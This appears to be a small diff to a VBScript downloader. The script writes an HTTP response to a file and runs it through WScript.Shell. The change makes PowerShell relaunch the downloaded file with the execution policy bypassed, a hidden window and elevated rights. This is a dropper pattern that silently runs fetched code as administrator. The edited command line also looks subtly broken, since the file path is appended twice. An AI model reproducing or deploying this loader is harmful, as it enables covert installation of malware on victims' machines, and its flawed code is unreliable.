@@ -20,6 +20,6 @@ For i = 1 To LenB( objHTTP.ResponseBody )
 Next
 objFile.Close()
 Set WshShell = CreateObject("WScript.Shell")
-cmd="powershell -executionpolicy bypass -file "
+cmd="powershell -command 'start-process PowerShell.exe -ArgumentList ""powershell -executionpolicy bypass -file "&file&""" -WindowStyle Hidden -Verb RunAs'"
 WshShell.Run cmd & file, 0, True
 Set WshShell = Nothing
